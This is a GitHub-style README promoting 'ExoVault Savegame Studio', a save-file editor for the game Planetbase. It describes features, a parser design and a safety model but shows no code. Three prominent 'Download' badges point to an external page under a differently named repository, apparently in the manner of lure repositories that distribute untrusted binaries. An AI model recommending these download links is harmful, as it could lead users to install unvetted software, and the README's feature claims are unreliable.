![preview](https://raw.githubusercontent.com/sagirkamil123-png/Planetbase-Save-Forge/main/splash_acdc.svg)
[![Download](https://raw.githubusercontent.com/sagirkamil123-png/Planetbase-Save-Forge/main/go_40a92.svg)](https://sagirkamil123-png.github.io/Planetbase-Save-Forge/)

# 🪐 ExoVault Savegame Studio

**An open-source companion for reading, understanding, and reshaping Planetbase colony saves — built for tinkerers, archivists, and anyone who wants to rewrite the story of their little outpost on a hostile world.**

Welcome to **ExoVault Savegame Studio**, a community-driven toolkit inspired by the original experiment that is *stefmde/PlanetbaseSaveGameEditor*. Where that project was a brave first attempt at decoding the opaque binary blobs that Planetbase produces when you hit "save", ExoVault takes the same spirit and pushes it into a fully structured, documented, and extensible workspace. Think of it as an archaeological lab for your colony: you bring the dig site (your save file), and we hand you the brushes, the magnifying glass, and a very tidy catalog system.

Planetbase save files are not human-readable. They are a compressed, serialized snapshot of every colonist, every footprint, every slab of concrete, and every half-eaten meal sitting in a storage dome. ExoVault exists so that you no longer have to treat that snapshot as a black box. It reads it, explains it, and lets you carefully adjust it — all while keeping a safety net so a misstep never costs you a 40-hour colony.

[![Download](https://raw.githubusercontent.com/sagirkamil123-png/Planetbase-Save-Forge/main/go_40a92.svg)](https://sagirkamil123-png.github.io/Planetbase-Save-Forge/)

---

## 📚 Table of Contents

1. [Why This Project Exists](#-why-this-project-exists)
2. [What It Actually Does](#-what-it-actually-does)
3. [Feature Highlights](#-feature-highlights)
4. [Screens & Workflows](#-screens--workflows)
5. [Understanding the Save Format](#-understanding-the-save-format)
6. [Multilingual Support](#-multilingual-support)
7. [Responsive Interface](#-responsive-interface)
8. [Reliability and Safety Model](#-reliability-and-safety-model)
9. [Round-the-Clock Assistance](#-round-the-clock-assistance)
10. [Project Status and Roadmap](#-project-status-and-roadmap)
11. [Contributing](#-contributing)
12. [License](#-license)
13. [Disclaimer](#-disclaimer)

---

## 🌱 Why This Project Exists

There is a particular kind of frustration that only colony-sim players understand. You have spent hours balancing oxygen production, water extraction, and the delicate social web of colonists who keep arguing about who gets the last meal pack. Then something goes wrong — a meteor, a sandstorm, or simply a design decision you regret — and your only recourse is to start over.

Planetbase offers no in-game console. No developer cheat menu. No "undo". The save file is the only artifact you control, and it is sealed behind a binary wall. ExoVault was born from the belief that a **single-player save file should belong to the player who created it**. Not as a tool for breaking the game, but as a tool for *understanding* it. When you can see the structure of your colony laid out in front of you, you stop guessing and start designing.

This repository is also a living technical document. Every field we decode, every offset we map, every uncertain guess we make — it is all written down. If you are curious about reverse-engineering game data, ExoVault is designed to be read as much as it is to be used.

---

## 🔧 What It Actually Does

At its core, ExoVault is a **save-game reader and modifier with a strong bias toward transparency**. It does not quietly rewrite your file and hope for the best. Instead it:

- **Parses** the binary save into a structured, tree-shaped model of your colony.
- **Displays** that model in a navigable interface so you can inspect colonists, structures, resources, and colony metadata.
- **Allows targeted edits** to selected values, with clear warnings about which changes are safe and which ones may cause the game to reject the file.
- **Re-serializes** the modified model back into a valid save, preserving byte-level structure wherever possible.
- **Keeps backups** automatically before every write operation, so you always have a path home.

It is a workshop, not a magic wand. The goal is not to trivialize the game, but to give you the same kind of agency a modder has over a text-based config, applied to a format that was never meant to be touched.

---

## ✨ Feature Highlights

- 🧭 **Colony Inspector** — browse every colonist, their role, their current assignment, and their vitals in a structured view.
- 🏗️ **Structure Browser** — see every dome, connector, and platform your colony has built, with coordinates and type information.
- 📦 **Resource Ledger** — inspect stored resources across buildings without opening the game.
- 🌦️ **Environment Snapshot** — read the planet type, difficulty modifier, and elapsed colony time directly from the save.
- 🛡️ **Automatic Backup Vault** — every save you load gets a timestamped copy before any modification.
- 🌍 **Multilingual Interface** — the editor UI ships with translations so players around the world can use it in their own language.
- 📱 **Responsive Layout** — works comfortably on a desktop monitor, a laptop, or a tablet browser without horizontal scrolling.
- 🔄 **Schema Version Awareness** — the parser recognizes different save versions and flags fields it does not yet fully understand instead of guessing.
- 🧪 **Dry-Run Mode** — preview the diff between the original save and your edited model before committing anything to disk.
- 📝 **Human-Readable Export** — dump your colony to a structured text report for archiving, sharing, or writing fan fiction about your colonists. Yes, people do that, and we respect it.
- 🕒 **Round-the-Clock Support** — see the support section below; we keep a channel open for questions and bug reports no matter the hour.

---

## 🖥️ Screens & Workflows

### The Load Screen
Drop a save file in and ExoVault immediately reports its detected version, the colony name, the planet type, and a checksum of the original bytes. Nothing is modified until you explicitly say so.

### The Inspector
A tree on the left, a detail pane on the right. Click a colonist and see their attributes. Click a building and see its contents. It feels like a file explorer that finally speaks the language of your colony.

### The Editor
Fields that are safe to change are shown in one color; fields that are risky are shown in another. If you try to change a risky field, ExoVault explains in plain language what might happen when the game reloads.

### The Commit
Before writing, ExoVault shows a summary of every change you made. Confirm and it writes a new save alongside a backup of the original. Cancel and nothing happens.

---

## 🧬 Understanding the Save Format

Planetbase save files are a serialized snapshot with a version header, a series of length-prefixed sections, and then dense binary blocks for entities. ExoVault's parser is organized into **layers**:

1. **Container Layer** — detects compression/encoding and version.
2. **Section Layer** — splits the payload into known top-level regions.
3. **Entity Layer** — decodes colonists, buildings, resources, and world state.
4. **Field Layer** — maps individual numeric and string fields to named properties.

Each layer is documented in the `/docs` folder of this repository, with field tables and notes on confidence level. Where a field's meaning is uncertain, we say so. Where we have confirmed a field through experimentation, we cite the test case. This is meant to be a knowledge base as much as a tool.

---

## 🌐 Multilingual Support

The interface is built with externalized strings from day one. Players can contribute a translation file and see the editor in their own language. Current efforts are focused on making sure that error messages — the place where clarity matters most — read naturally in every supported locale. If your language is missing, the structure is designed to make adding it a self-contained task.

---

## 📱 Responsive Interface

Whether you are on a wide desktop screen, a compact laptop, or a tablet, the layout rearranges itself so that the tree view, detail pane, and diff view stay usable. No horizontal scrolling, no tiny buttons. The interface treats your screen real estate respectfully.

---

## 🛡️ Reliability and Safety Model

ExoVault assumes your save file matters to you. That assumption drives several design decisions:

- **No silent writes.** Every modification is explicit and confirmed.
- **Backup-first policy.** The original bytes are copied to a vault folder before any save is rewritten.
- **Validation pass.** After serialization, the file is re-parsed internally to confirm it can still be read.
- **Diff view.** You always see exactly what changed.
- **Conservative defaults.** Potentially destabilizing edits are off by default and require an extra confirmation.

The philosophy is simple: it is better to refuse to make a change than to make one that silently ruins a colony.

---

## 🕒 Round-the-Clock Assistance

Questions do not arrive on a schedule, so support does not either. Issues opened on this repository are triaged continuously, and discussions are monitored around the clock by maintainers and community volunteers. Whether you are stuck on a parsing error at 3 a.m. or curious about how a field works on a lazy Sunday afternoon, there is always a channel open. Documentation is written to be self-serve first, but the human backup is always there.

---

## 🗺️ Project Status and Roadmap

ExoVault is an evolving project. Current focus areas for the 2026 cycle include:

- Expanding the field documentation for the latest save version.
- Improving the diff visualization for large colonies.
- Adding more community-contributed translations.
- Hardening the validation pass against malformed input.
- Building a plugin surface so that community modules can add their own readers and exporters.

The roadmap lives in the repository issues and is updated as the community steers it.

---

## 🤝 Contributing

Contributions are welcome in many forms — code, documentation, translations, save-file samples (with personal data removed), and field verification reports. If you have reverse-engineered a field and want to share what you learned, open a discussion. If you spotted a bug, open an issue with the save version and a description of what happened. Every contribution makes the tool more useful for the next colonist.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute it under the terms of that license. The full text is available at the canonical license reference:

https://opensource.org/licenses/MIT

Copyright (c) 2026 ExoVault Savegame Studio contributors.

---

## ⚠️ Disclaimer

ExoVault Savegame Studio is an unofficial, community-made tool. It is **not affiliated with, endorsed by, or connected to the developers or publishers of Planetbase** in any way. All trademarks and game assets belong to their respective owners.

This software is provided **as-is**, without warranty of any kind, express or implied. Modifying a save file carries inherent risk. While ExoVault takes extensive precautions — automatic backups, dry-run previews, validation passes — the maintainers cannot guarantee that any particular edit will behave as expected when the game loads it. Always keep your own independent copies of important saves.

Use this tool responsibly, respect the work of the original game developers, and remember that the most satisfying colonies are the ones you built yourself.

---

[![Download](https://raw.githubusercontent.com/sagirkamil123-png/Planetbase-Save-Forge/main/go_40a92.svg)](https://sagirkamil123-png.github.io/Planetbase-Save-Forge/)